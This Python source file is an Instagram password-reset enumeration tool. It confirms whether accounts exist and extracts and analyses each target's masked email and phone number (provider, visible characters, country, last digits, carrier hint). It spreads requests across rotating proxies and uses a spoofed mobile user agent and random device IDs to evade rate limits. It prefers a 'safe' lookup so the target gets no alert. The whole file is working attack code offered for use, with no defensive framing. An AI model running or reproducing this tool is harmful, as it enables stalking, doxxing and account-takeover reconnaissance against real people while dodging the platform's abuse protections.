"""
reset enumerator — instagram password reset flow enumeration
extracts masked email & phone, verifies account existence
active probing — use proxies, respect rate limits, minimize alert risk
"""

import asyncio
import logging
import random
import re
import time
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import aiohttp

logger = logging.getLogger(__name__)


@dataclass
class ResetData:
    """data extracted from password reset flow"""

    username: str
    account_exists: bool = False
    account_locked: bool = False

    # masked contact info
    masked_email: str = ""
    masked_phone: str = ""
    has_email: bool = False
    has_phone: bool = False

    # email analysis
    email_provider: str = ""           # gmail.com, yahoo.com, etc
    email_first_char: str = ""         # first visible char
    email_last_chars: str = ""         # chars before @
    email_domain: str = ""             # full domain
    email_masked_length: int = 0       # estimated total length

    # phone analysis
    phone_country_code: str = ""       # +1, +44, +92, etc
    phone_country_name: str = ""       # United States, etc
    phone_last_digits: str = ""        # last 2-4 visible digits
    phone_masked_pattern: str = ""     # full masked pattern
    phone_carrier_hint: str = ""       # estimated carrier from prefix

    # metadata
    response_time_ms: float = 0.0
    proxy_used: str = ""
    attempts: int = 0
    extracted_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


class ResetEnumerator:
    """
    instagram password reset flow enumerator
    extracts masked email and phone number

    usage:
        enumerator = ResetEnumerator(proxy_rotator=rotator)
        data = await enumerator.enumerate("john_doe_")
        # data.masked_email → "j****e@gmail.com"
        # data.masked_phone → "+1 3** *** 5678"
        # data.email_provider → "gmail.com"

    ⚠️ each attempt may trigger an email/SMS to the target
       use sparingly — rate limit: 1 request per proxy per hour
    """

    # instagram password reset endpoints
    RESET_SEND_ENDPOINT = (
        "https://www.instagram.com/api/v1/accounts/send_password_reset/"
    )
    RESET_VERIFY_ENDPOINT = (
        "https://www.instagram.com/api/v1/accounts/check_password_reset_code/"
    )

    # login info check — sometimes reveals masked contact without sending reset
    LOGIN_INFO_ENDPOINT = (
        "https://www.instagram.com/api/v1/accounts/lookup/"
    )

    # country code → name mapping
    COUNTRY_MAP = {
        "1": "United States / Canada",
        "44": "United Kingdom",
        "91": "India",
        "92": "Pakistan",
        "86": "China",
        "81": "Japan",
        "82": "South Korea",
        "61": "Australia",
        "49": "Germany",
        "33": "France",
        "39": "Italy",
        "34": "Spain",
        "55": "Brazil",
        "7": "Russia",
        "52": "Mexico",
        "54": "Argentina",
        "63": "Philippines",
        "84": "Vietnam",
        "90": "Turkey",
        "966": "Saudi Arabia",
        "971": "UAE",
        "20": "Egypt",
        "234": "Nigeria",
        "27": "South Africa",
    }

    def __init__(
        self,
        proxy_rotator=None,       # ProxyRotator instance
        session_manager=None,     # SessionManager instance
        fingerprint_engine=None,  # FingerprintEngine instance
        max_retries: int = 2,
        timeout: int = 15,
        respect_rate_limit: bool = True,
        cooldown_per_proxy: int = 3600,  # 1 hour per proxy
        safe_mode: bool = True,          # if True, use lookup first (no alert)
    ):
        self.proxy_rotator = proxy_rotator
        self.session_manager = session_manager
        self.fingerprint_engine = fingerprint_engine
        self.max_retries = max_retries
        self.timeout = timeout
        self.respect_rate_limit = respect_rate_limit
        self.cooldown_per_proxy = cooldown_per_proxy
        self.safe_mode = safe_mode

        self._http_session: Optional[aiohttp.ClientSession] = None
        self._proxy_usage: dict[str, float] = {}  # proxy → last used timestamp
        self._lock = asyncio.Lock()

    async def _get_http(self) -> aiohttp.ClientSession:
        if self._http_session is None or self._http_session.closed:
            self._http_session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                headers=self._build_headers(),
            )
        return self._http_session

    async def close(self):
        if self._http_session and not self._http_session.closed:
            await self._http_session.close()

    # ─── main enumeration ──────────────────────────────────────────

    async def enumerate(self, username: str) -> ResetData:
        """
        enumerate account via password reset flow
        tries safe lookup first, then full reset if needed
        """
        username = self._clean_username(username)
        data = ResetData(username=username)
        logger.info("[enumerator] probing: @%s", username)

        # phase 1: safe lookup (no alert sent to target)
        if self.safe_mode:
            lookup_data = await self._try_lookup(username)
            if lookup_data and lookup_data.account_exists:
                # lookup sometimes returns masked data without sending reset
                if lookup_data.masked_email or lookup_data.masked_phone:
                    logger.info("[enumerator] @%s — data from safe lookup", username)
                    return lookup_data
                data.account_exists = True

        # phase 2: password reset request (may trigger email/SMS)
        for attempt in range(1, self.max_retries + 1):
            try:
                reset_data = await self._try_reset(username)
                if reset_data and reset_data.account_exists:
                    reset_data.attempts = attempt
                    logger.info(
                        "[enumerator] @%s — email:%s phone:%s",
                        username,
                        reset_data.masked_email[:20] if reset_data.masked_email else "none",
                        reset_data.masked_phone if reset_data.masked_phone else "none",
                    )
                    return reset_data

                if reset_data and reset_data.account_locked:
                    data.account_locked = True
                    logger.warning("[enumerator] @%s — account locked (too many attempts)", username)
                    return data

            except asyncio.TimeoutError:
                logger.warning("[enumerator] timeout on attempt %d", attempt)
            except Exception as e:
                logger.error("[enumerator] error on attempt %d: %s", attempt, e)

            if attempt < self.max_retries:
                await asyncio.sleep(2 ** attempt)

        logger.warning("[enumerator] @%s — all attempts exhausted", username)
        return data

    async def enumerate_batch(
        self, usernames: list[str], max_concurrent: int = 2
    ) -> list[ResetData]:
        """enumerate multiple accounts (low concurrency — rate limits)"""
        semaphore = asyncio.Semaphore(max_concurrent)

        async def _enumerate_one(user: str) -> ResetData:
            async with semaphore:
                return await self.enumerate(user)

        tasks = [_enumerate_one(u) for u in usernames]
        return await asyncio.gather(*tasks, return_exceptions=True)

    # ─── safe lookup ───────────────────────────────────────────────

    async def _try_lookup(self, username: str) -> Optional[ResetData]:
        """
        try the accounts/lookup endpoint
        this often returns masked contact info WITHOUT sending a reset email/SMS
        safer than full reset request
        """
        proxy = await self._get_safe_proxy()
        if not proxy:
            return None

        proxy_url = self._format_proxy(proxy)

        headers = self._build_headers()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["X-IG-App-ID"] = "936619743392459"

        payload = {
            "username": username,
            "device_id": self._generate_device_id(),
        }

        start_time = time.monotonic()

        try:
            http = await self._get_http()
            async with http.post(
                self.LOGIN_INFO_ENDPOINT,
                data=payload,
                proxy=proxy_url,
                headers=headers,
            ) as resp:
                elapsed_ms = (time.monotonic() - start_time) * 1000

                if resp.status == 200:
                    raw = await resp.json()
                    data = ResetData(
                        username=username,
                        account_exists=True,
                        response_time_ms=elapsed_ms,
                        proxy_used=proxy,
                    )

                    # extract masked info
                    data = self._extract_masked_info(data, raw)
                    return data

                if resp.status == 404:
                    return ResetData(
                        username=username,
                        account_exists=False,
                        response_time_ms=elapsed_ms,
                    )

                if resp.status == 429:
                    if self.proxy_rotator:
                        await self.proxy_rotator.report_failure(proxy, rate_limited=True)
                    return None

                logger.debug("[enumerator] lookup returned %d", resp.status)
                return None

        except Exception as e:
            logger.debug("[enumerator] lookup failed: %s", e)
            return None

    # ─── full reset request ────────────────────────────────────────

    async def _try_reset(self, username: str) -> Optional[ResetData]:
        """
        send a password reset request
        instagram returns masked email and/or phone in the response
        ⚠️ this WILL trigger an email/SMS to the target
        """
        proxy = await self._get_safe_proxy()
        if not proxy:
            logger.warning("[enumerator] no safe proxy available")
            return None

        proxy_url = self._format_proxy(proxy)

        headers = self._build_headers()
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["X-IG-App-ID"] = "936619743392459"
        headers["X-Requested-With"] = "XMLHttpRequest"
        headers["Referer"] = "https://www.instagram.com/accounts/password/reset/"

        # instagram sometimes asks for email_or_username, sometimes just username
        payload = {
            "email_or_username": username,
            "device_id": self._generate_device_id(),
            "guid": self._generate_guid(),
            "auto_confirm": "true",
        }

        start_time = time.monotonic()

        try:
            http = await self._get_http()
            async with http.post(
                self.RESET_SEND_ENDPOINT,
                data=payload,
                proxy=proxy_url,
                headers=headers,
            ) as resp:
                elapsed_ms = (time.monotonic() - start_time) * 1000

                if resp.status == 200:
                    raw = await resp.json()
                    data = ResetData(
                        username=username,
                        account_exists=True,
                        response_time_ms=elapsed_ms,
                        proxy_used=proxy,
                    )

                    data = self._extract_masked_info(data, raw)

                    # mark proxy as used
                    await self._mark_proxy_used(proxy)

                    return data

                if resp.status == 429:
                    if self.proxy_rotator:
                        await self.proxy_rotator.report_failure(proxy, rate_limited=True)
                    logger.warning("[enumerator] rate limited")
                    return None

                if resp.status == 400:
                    raw = await resp.json()
                    message = raw.get("message", "").lower()
                    if "locked" in message or "too many" in message:
                        return ResetData(
                            username=username,
                            account_locked=True,
                            response_time_ms=elapsed_ms,
                        )

                if resp.status == 404:
                    return ResetData(
                        username=username,
                        account_exists=False,
                        response_time_ms=elapsed_ms,
                    )

                logger.debug("[enumerator] reset returned %d", resp.status)
                return None

        except Exception as e:
            logger.debug("[enumerator] reset failed: %s", e)
            return None

    # ─── data extraction ───────────────────────────────────────────

    def _extract_masked_info(self, data: ResetData, raw: dict) -> ResetData:
        """extract masked email and phone from API response"""

        # instagram returns masked contact in various fields
        masked_email = (
            raw.get("obfuscated_email")
            or raw.get("masked_email")
            or raw.get("email_sent_to")
            or raw.get("contact_point")
            or ""
        )

        masked_phone = (
            raw.get("obfuscated_phone")
            or raw.get("masked_phone")
            or raw.get("sms_sent_to")
            or raw.get("phone_number")
            or ""
        )

        # sometimes contact info is in a nested "step_data" or "extra" field
        if not masked_email and not masked_phone:
            step_data = raw.get("step_data", raw.get("extra", {}))
            if isinstance(step_data, dict):
                masked_email = step_data.get("obfuscated_email", "")
                masked_phone = step_data.get("obfuscated_phone", "")

        # sometimes in "message" field — "We sent a code to j***@gmail.com"
        if not masked_email and not masked_phone:
            message = raw.get("message", "")
            email_match = re.search(
                r'[\w*]+@[\w.-]+\.\w+', message, re.IGNORECASE
            )
            if email_match:
                masked_email = email_match.group(0)

        # populate data
        if masked_email:
            data.masked_email = masked_email
            data.has_email = True
            data = self._analyze_email(data, masked_email)

        if masked_phone:
            data.masked_phone = masked_phone
            data.has_phone = True
            data = self._analyze_phone(data, masked_phone)

        return data

    def _analyze_email(self, data: ResetData, masked: str) -> ResetData:
        """extract details from masked email"""
        data.masked_email = masked.strip()

        # extract domain
        if "@" in masked:
            data.email_domain = masked.split("@")[1]

            # provider
            domain_lower = data.email_domain.lower()
            if "gmail" in domain_lower:
                data.email_provider = "gmail.com"
            elif "yahoo" in domain_lower:
                data.email_provider = "yahoo.com"
            elif "hotmail" in domain_lower or "outlook" in domain_lower:
                data.email_provider = "outlook.com"
            elif "icloud" in domain_lower:
                data.email_provider = "icloud.com"
            elif "protonmail" in domain_lower:
                data.email_provider = "protonmail.com"
            else:
                data.email_provider = domain_lower

            # extract visible chars from local part
            local_part = masked.split("@")[0]
            data.email_first_char = local_part[0] if local_part else ""
            data.email_last_chars = local_part[-2:] if len(local_part) > 1 else ""
            data.email_masked_length = len(local_part)

        return data

    def _analyze_phone(self, data: ResetData, masked: str) -> ResetData:
        """extract details from masked phone number"""
        data.masked_phone = masked.strip()
        data.phone_masked_pattern = masked

        # extract country code
        cc_match = re.match(r'\+(\d{1,3})', masked)
        if cc_match:
            data.phone_country_code = "+" + cc_match.group(1)
            country_name = self.COUNTRY_MAP.get(cc_match.group(1))
            if country_name:
                data.phone_country_name = country_name

        # extract last digits
        digits = re.findall(r'\d', masked)
        if digits:
            data.phone_last_digits = "".join(digits[-4:])

            # carrier hint from first digits after country code
            if len(digits) > 4:
                prefix_digits = digits[1:4] if len(digits) > 4 else digits[1:]
                data.phone_carrier_hint = "".join(prefix_digits)

        return data

    # ─── proxy management ──────────────────────────────────────────

    async def _get_safe_proxy(self) -> Optional[str]:
        """get a proxy that hasn't been used for reset recently"""
        if not self.proxy_rotator:
            return None

        for _ in range(10):  # try up to 10 proxies
            proxy = await self.proxy_rotator.get_proxy()
            if not proxy:
                return None

            if self.respect_rate_limit:
                async with self._lock:
                    last_used = self._proxy_usage.get(proxy, 0)
                    if time.time() - last_used >= self.cooldown_per_proxy:
                        return proxy
                    # skip — this proxy was used recently
                    continue

            return proxy

        return None  # all proxies exhausted

    async def _mark_proxy_used(self, proxy: str):
        """record proxy usage timestamp"""
        async with self._lock:
            self._proxy_usage[proxy] = time.time()

    # ─── helpers ───────────────────────────────────────────────────

    def _build_headers(self) -> dict:
        return {
            "User-Agent": (
                "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/126.0.6478.122 Mobile Safari/537.36"
            ),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }

    def _generate_device_id(self) -> str:
        return f"android-{''.join(random.choices('0123456789abcdef', k=16))}"

    def _generate_guid(self) -> str:
        return (
            f"{''.join(random.choices('0123456789abcdef', k=8))}"
            f"-{''.join(random.choices('0123456789abcdef', k=4))}"
            f"-{''.join(random.choices('0123456789abcdef', k=4))}"
            f"-{''.join(random.choices('0123456789abcdef', k=4))}"
            f"-{''.join(random.choices('0123456789abcdef', k=12))}"
        )

    def _format_proxy(self, proxy: str) -> Optional[str]:
        if not proxy:
            return None
        if proxy.startswith(("http://", "socks5://", "socks4://")):
            return proxy
        return f"socks5://{proxy}"

    @staticmethod
    def _clean_username(username: str) -> str:
        username = username.strip()
        if username.startswith("@"):
            username = username[1:]
        return username.strip("/").strip()